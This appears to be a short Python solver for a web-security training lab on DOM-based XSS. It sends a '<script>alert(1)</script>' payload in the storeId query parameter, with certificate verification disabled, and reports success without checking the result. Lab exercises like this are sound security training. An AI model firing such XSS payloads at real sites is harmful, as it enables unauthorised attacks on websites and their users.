import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "DOM XSS in document.write sink using source location.search inside a select element"

def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload in the storeId search query parameter\n2. Observe that the alert function has been called\n""")

    path = "/product?productId=1&storeId="
    payload = "<script>alert(1)</script>"
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False